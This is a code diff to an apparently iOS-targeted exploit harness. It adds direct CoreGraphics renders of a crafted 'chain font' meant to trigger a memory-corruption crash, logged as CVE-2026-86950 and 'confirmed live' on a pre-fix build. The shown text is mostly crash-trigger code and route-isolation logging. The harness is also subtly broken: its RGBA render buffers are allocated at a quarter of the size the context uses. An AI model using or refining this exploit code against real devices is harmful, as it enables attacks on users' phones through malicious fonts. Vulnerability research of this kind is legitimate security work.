@@ -36,7 +36,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P072_BUILD @"p072-86950-pdf-vehicle-v3"
+#define P072_BUILD @"p072-86950-direct-v4"
 
 static void p072_dl(void (^L)(NSString *), const char *path) {
     void *h = dlopen(path, RTLD_LAZY);
@@ -637,6 +637,73 @@ static NSData *p072v3_build_pdf(NSData *ttf){
     }
     Lv(@"v3 crash decode: ips with aa_cache_render + EXC_BAD_ACCESS / 16-bit");
     Lv(@"stores = CVE-2026-86950 confirmed live; craft persisted to Documents/");
+    /* ===== v4: DIRECT device-side renders of the v3 chain font =====
+       The v3 PDF route survived on pre-fix 23F77 while the same geometry
+       renders through direct CG drawing locally. Isolate the route:
+       direct ShowGlyphsAtPositions of gid10, pixel-counted. */
+    Lv(@"=== v4 DIRECT renders of the chain font (route isolation) ===");
+    {
+        CGDataProviderRef dpC = CGDataProviderCreateWithCFData((__bridge CFDataRef)ttf3);
+        CGFontRef chainFont = dpC ? CGFontCreateWithDataProvider(dpC) : NULL;
+        if (dpC) CFRelease(dpC);
+        if (!chainFont) {
+            Lv(@"v4 font load FAIL — route isolation unavailable");
+        } else {
+            Lv([NSString stringWithFormat:@"v4 chain font loaded glyphs=%zu",
+                CGFontGetNumberOfGlyphs(chainFont)]);
+            /* pixels-of-draw helper: white-on-black draw, count non-zero b/px */
+            struct { int gray; BOOL smooth; double size; const char *tag; } V4[] = {
+                { 0, YES,  1024.0, "V4a rgba size=1024 (chain fire attempt)" },
+                { 1, NO,   1024.0, "V4b gray+AlphaNone smooth=OFF size=1024 (calif direct recipe)" },
+                { 0, YES,  17.0,   "V4c rgba size=17 (chain verify: expect >> leaf)" },
+                { 0, YES,  17.0,   "V4d rgba size=17 leaf gid1 (baseline)" },
+            };
+            CGGlyph v4g[] = { 10, 10, 10, 1 };
+            for (int vi=0; vi<4; vi++) {
+                Lv([NSString stringWithFormat:@"v4 [%s] pre-render",
+                    V4[vi].tag]);
+                const int D=1024;
+                uint8_t *buf = calloc((size_t)D*D, 1);
+                CGContextRef c4 = NULL; CGColorSpaceRef cs4 = NULL;
+                if (V4[vi].gray) {
+                    cs4 = CGColorSpaceCreateDeviceGray();
+                    c4 = CGBitmapContextCreate(buf, D, D, 8, D, cs4, kCGImageAlphaNone);
+                } else {
+                    cs4 = CGColorSpaceCreateDeviceRGB();
+                    c4 = CGBitmapContextCreate(buf, D, D, 8, 4*D, cs4,
+                                               kCGImageAlphaPremultipliedLast);
+                }
+                if (c4) {
+                    CGContextSetGrayFillColor(c4, 1, 1);
+                    CGContextSetFont(c4, chainFont);
+                    CGContextSetFontSize(c4, V4[vi].size);
+                    CGContextSetShouldSmoothFonts(c4, V4[vi].smooth);
+                    CGPoint pv = { 20, 20 };
+                    CGGlyph gv = v4g[vi];
+                    CGContextShowGlyphsAtPositions(c4, &gv, &pv, 1);
+                    CGContextFlush(c4);
+                    long px4 = 0;
+                    int bpp = V4[vi].gray ? 1 : 4;
+                    for (int y=0; y<D; y++)
+                        for (int x=0; x<D; x++) {
+                            int nz = 0;
+                            for (int b=0; b<bpp; b++)
+                                nz |= buf[(size_t)(y*D+x)*bpp + b];
+                            if (nz) px4++;
+                        }
+                    Lv([NSString stringWithFormat:@"v4 [%s] SURVIVED pixels=%ld",
+                        V4[vi].tag, px4]);
+                    CGContextRelease(c4);
+                } else {
+                    Lv([NSString stringWithFormat:@"v4 [%s] ctx FAIL (mem?)",
+                        V4[vi].tag]);
+                }
+                if (cs4) CGColorSpaceRelease(cs4);
+                free(buf);
+            }
+            CFRelease(chainFont);
+        }
+    }
 
     L(@"[oracle] if no crash: naive+band sweep AND the v3 PDF vehicle both");
     L(@"missed on this build — craft persisted for the ips-side decode.");
